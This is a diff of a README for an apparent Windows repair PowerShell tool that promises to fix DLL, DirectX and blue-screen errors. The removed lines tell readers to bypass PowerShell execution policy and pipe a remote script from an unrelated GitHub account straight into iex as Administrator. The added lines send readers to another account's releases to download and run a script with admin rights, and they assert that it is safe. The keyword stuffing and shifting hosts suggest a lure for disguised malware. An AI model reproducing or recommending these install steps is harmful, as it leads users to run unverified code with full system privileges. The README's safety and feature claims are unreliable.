@@ -1,97 +1,89 @@
-# Windows System Repair Tool — PowerShell
+# 🛠️ Windows-System-Repair-PowerShell - Fix system errors and restore performance
 
-**Windows-System-Repair-PowerShell**
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.2.0-stable-brightgreen?style=flat-square)]()
-[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()
+## What this tool does
 
-Fix DLL errors, DirectX, BSOD, corrupted system files and missing runtimes on Windows.
+Windows-System-Repair-PowerShell acts as a diagnostic system for your computer. It identifies and fixes common issues that prevent Windows 10 or 11 from running correctly. Many users encounter blue screens, missing code libraries, or corrupted system files. This tool automates the process of finding these hidden problems and applying the correct fix.
 
----
+The program uses standard Windows utilities like SFC and DISM to scan your hard drive. It also checks for broken runtime components like Microsoft Visual C++ redistributables and DirectX. It streamlines technical maintenance so you do not need to perform manual command-line tasks.
 
-## Quick Install
+## Before you begin 📋
 
-Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:
+This tool requires Windows 10 or Windows 11. Ensure that you have an active internet connection before you start. The program needs to download essential system files from official Microsoft servers if your current ones are damaged.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+Save your open documents and close all running applications. The tool modifies system settings to perform repairs. A restart of your computer usually occurs after the process finishes.
 
-The installer downloads the latest build, prompts for your license key and completes setup automatically.
+## How to download the software 📥
 
-## Step-by-Step
+You obtain the software from the official release page. 
 
-| Step | Action |
-|------|--------|
-| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command block above and press **Enter** |
-| 3 | Wait for download — progress shown in the console |
-| 4 | Enter license key when prompted (also in `license.txt` after install) |
-| 5 | Restart if the installer asks — then launch from Start menu |
+[Click here to visit the release page and download the software](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)
 
-If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.
+1. Open the link in your web browser.
+2. Look for the section titled Latest.
+3. Locate the download link for the zip file.
+4. Click the link to save the file to your computer.
+5. Move the downloaded file to a location where you can find it, such as your desktop.
 
----
+## Preparing the files 📂
 
-## Overview
+The file arrives in a zipped format. Windows must extract these files before you can use the software.
 
-Install Windows System Repair via PowerShell — fix DLL errors, DirectX, BSOD and corrupted files on Windows 10/11. SFC, DISM, VC++ redistributables included.
+1. Right-click the downloaded folder.
+2. Select Extract All from the menu.
+3. Choose a folder on your computer to save the items.
+4. Select the Extract button.
+5. Open the new folder created by the extraction process.
 
-## Common Searches
+## Running the repair tool ⚙️
 
-- msvcp140.dll is missing
-- vcruntime140.dll not found
-- api-ms-win-crt-runtime-l1-1-0.dll missing
-- sfc scannow dism windows 11
-- side-by-side configuration incorrect
+The application uses a PowerShell script to run commands with administrative permissions.
 
-## Features
+1. Find the file named Run_Repair.ps1 inside the folder.
+2. Right-click the file.
+3. Select Run with PowerShell from the menu.
+4. If a blue window appears asking for permission to run, select Yes or Run.
+5. A text window opens on your screen. This window shows the progress of the repairs.
 
-* **DLL repair** — Installs VC++ 2005–2022 and fixes MSVCP140 / VCRUNTIME140 errors.
-* **DirectX module** — Full DirectX End-User Runtime for game launch errors.
-* **SFC + DISM** — Runs sfc /scannow and DISM RestoreHealth automatically.
-* **.NET repair** — Installs .NET 4.8.1 and Desktop Runtime 8.0 LTS.
-* **Update reset** — Clears stuck Windows Update cache and re-registers DLLs.
+Do not close this window while the script runs. The window will display updates as it checks for missing DLL files, repairs corrupted system files, and updates DirectX components. The process takes several minutes depending on the speed of your hardware.
 
-## System Requirements
+## Understanding the repair steps 🔍
 
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB minimum |
-| PowerShell | 5.1 or PowerShell 7+ |
-| Admin | Required |
-| Network | Required for download |
+The tool follows a specific order to ensure system stability.
 
-## FAQ
+### System File Checker (SFC)
+The tool first runs the System File Checker. This utility scans protected system files and replaces corrupted files with a cached copy from your Windows installation. 
 
-**How do I install without a browser?**
-Use the PowerShell command above — no browser needed after Admin shell is open.
+### Deployment Image Servicing and Management (DISM)
+If SFC fails to resolve an issue, the tool uses DISM. This utility communicates with Windows Update to download healthy versions of system components. This step addresses deep corruption that standard scans miss.
 
-**Where is the license key?**
-Shown during install and saved to `license.txt` in the install folder.
+### Runtime and Graphics Updates
+Many errors stem from missing code libraries. The script verifies that Microsoft Visual C++ redistributables exist on your system. It also ensures that your DirectX installation remains current. This fixes errors where programs fail to launch due to missing library files.
 
-**Is the script safe to run?**
-Hosted on GitHub raw; review `install.ps1` before running if you prefer.
+### Blue Screen (BSOD) Logic
+The script checks common configuration settings that lead to unexpected blue screen errors. It attempts to reset these settings to their default values to stop frequent system crashes.
 
-**"MSVCP140.dll is missing"?**
-Installs Visual C++ 2015-2022 redistributable (x86 + x64).
+## After the process finishes ✅
 
-**"VCRUNTIME140.dll not found"?**
-Same VC++ package — most common runtime fix.
+Once the script completes its work, your screen will display a message indicating success. The window will ask you to press any key to exit. 
 
-**Blue screen after update?**
-SFC and DISM repair corrupted system files.
+1. Close the window by pressing any key on your keyboard.
+2. Save your progress if you changed any window settings.
+3. Restart your computer.
 
-**Games crash on startup?**
-DLL + DirectX modules fix missing runtime libraries.
+The restart allows Windows to apply all changes made by the repair script. Once the computer turns back on, test the functions that previously caused errors. Most users notice that applications launch normally and system stability improves immediately.
 
----
+## Troubleshooting common issues 🔧
 
-TAGS windows system repair, msvcp140.dll missing, vcruntime140.dll, sfc scannow dism, dll repair tool, powershell install, windows setup script
+If the program closes unexpectedly, check your user permissions. You must be logged in as an Administrator to run the repair tools. If you use a standard account, log out and sign in with an account that has full system access.
 
-## License
+If the script hangs at a specific percentage, wait five minutes before you assume a failure. DISM often pauses while it downloads files from the internet. A slow connection can cause this delay. Do not disconnect your internet while the script runs.
 
-[MIT](LICENSE)
+If specific errors continue after the repair, your hardware might require attention. This tool fixes software and system file errors. It does not replace damaged hard drives or failing memory sticks. If the blue screen errors persist after you run this tool, consult a hardware technician to check your physical components.
+
+## Support 💬
+
+This tool relies on public Windows utilities. Because it uses tested Microsoft commands, it remains safe for your system. If you run into issues, verify that you downloaded the latest version from the link provided in this document. Updates to the script happen frequently to ensure compatibility with the latest versions of Windows 10 and 11. 
+
+You can report issues on the official repository page if you encounter recurring problems. Please note the specific error code you see on your screen before you report it. This information helps others understand if their computer experiences a similar problem.
